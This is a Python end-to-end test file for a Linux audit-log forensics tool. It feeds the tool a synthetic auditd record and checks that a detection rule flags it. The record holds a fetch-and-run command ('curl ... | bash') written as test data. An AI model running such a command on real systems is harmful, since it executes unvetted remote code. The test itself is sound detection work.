"""End-to-end tests using auditd-formatted evidence."""

import json
from pathlib import Path

from typer.testing import CliRunner

from linuxtrace.cli import app
from linuxtrace.collectors.audit_import import import_audit

runner = CliRunner()


def test_audit_log_to_detection(tmp_path):
    root = tmp_path / "evidence"
    log = root / "var/log/audit/audit.log"
    log.parent.mkdir(parents=True)

    log.write_text(
        "type=SYSCALL msg=audit(1794996001.123:900): "
        "arch=c000003e syscall=59 success=yes "
        "pid=1200 uid=1000 auid=1000 "
        'comm="bash" exe="/usr/bin/bash"\n'
        "type=EXECVE msg=audit(1794996001.123:900): "
        'argc=3 a0="bash" a1="-c" '
        'a2="curl https://example.com/setup.sh | bash"\n'
    )

    db = tmp_path / "linuxtrace.db"
    imported = import_audit(root=root, db_path=db)

    assert not imported.errors
    assert imported.events_inserted == 1

    result = runner.invoke(
        app,
        ["detect", "run", "--db", str(db), "--json"],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)

    assert payload["total_findings"] == 1
    assert payload["findings"][0]["rule_id"] == "LT-AUDIT-001"


def test_existing_audit_fixture_has_no_remote_shell_finding(tmp_path):
    root = Path("tests/fixtures/audit").resolve()
    db = tmp_path / "linuxtrace.db"

    imported = import_audit(root=root, db_path=db)

    assert not imported.errors

    result = runner.invoke(
        app,
        ["detect", "run", "--db", str(db), "--json"],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)

    assert not any(item["rule_id"] == "LT-AUDIT-001" for item in payload["findings"])
